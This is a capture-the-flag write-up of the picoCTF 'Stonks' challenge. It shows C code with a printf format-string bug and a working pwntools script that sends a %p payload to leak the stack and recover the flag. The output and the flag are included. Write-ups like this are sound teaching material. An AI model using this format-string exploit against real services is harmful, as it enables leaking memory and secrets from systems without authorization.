# Writeup: Stonks

## Introduction

In this code we will be taking advantage of the string format vulnerability to leak the contents of the api key buffer (the flag). 

### buy_stonks function

```
        char api_buf[FLAG_BUFFER];
        FILE *f = fopen("api","r");
        if (!f) {
                printf("Flag file not found. Contact an admin.\n");
                exit(1);
        }
        fgets(api_buf, FLAG_BUFFER, f);

        int money = p->money;
        int shares = 0;
        Stonk *temp = NULL;
        printf("Using patented AI algorithms to buy stonks\n");
        while (money > 0) {
                shares = (rand() % money) + 1;
                temp = pick_symbol_with_AI(shares);
                temp->next = p->head;
                p->head = temp;
                money -= shares;
        }
        printf("Stonks chosen\n");

        // TODO: Figure out how to read token from file, for now just ask

        char *user_buf = malloc(300 + 1);
        printf("What is your API token?\n");
        scanf("%300s", user_buf);
        printf("Buying stonks with token:\n");
        printf(user_buf);
```

As you can see the string format vulnerability exists in this code due to the printf function printing user_buf without a format specifier. All we need to do is to leak the contents of the stack and then convert the contents from hex to ascii so that we can see if we can find the flag. To this I will be using this script I wrote that does exactly that.

```
    from pwn import *
 
    p = remote('wily-courier.picoctf.net', 62528)

    payload = b'%1$p-%2$p-%3$p-%4$p-%5$p-%6$p-%7$p-%8$p-%9$p-%10$p-%11$p-%12$p-%13$p-%14$p-%15$p-%16$p-%17$p-%18$p-%19$p-%20$p-%21$p-%22$p-%23$p-%24$p-%25$p-%26$p-%27$p-%28$p-%29$p-%30$p'

    p.recvuntil(b'2) View my portfolio')
    p.sendline(b'1')

    p.recvuntil(b'?\n')
    p.sendline(payload)

    p.recvuntil(b':\n')
    response = p.recvline()

    values = response.decode().strip().split('-')


    for val in values:

        try:
            num = int(val, 16)
            byte_length = (num.bit_length() + 7) // 8
            for byte in num.to_bytes(byte_length, 'little'):
                print(chr(byte), end='')
        except:
            pass
```

## Results

Now all that is left to do is to deploy the script and see if we have found our flag.

```
    [+] Opening connection to wily-courier.picoctf.net on port 62528: Done
    £\x1\x00°\x0Ã\x0­Ë÷ÿÿÿÿ`\x1\x101Ì÷Ç­Ë÷\x1p£\x1£\x1picoCTF{I_l05t_4ll_my_m0n3y_c0bcd089}
    \x00ÿø*Ï÷@4Ì÷\x00é7©é|µ÷[*] Closed connection to wily-courier.picoctf.net port 62528
```
Finally, we have our flag: 
`picoCTF{I_l05t_4ll_my_m0n3y_c0bcd089}`
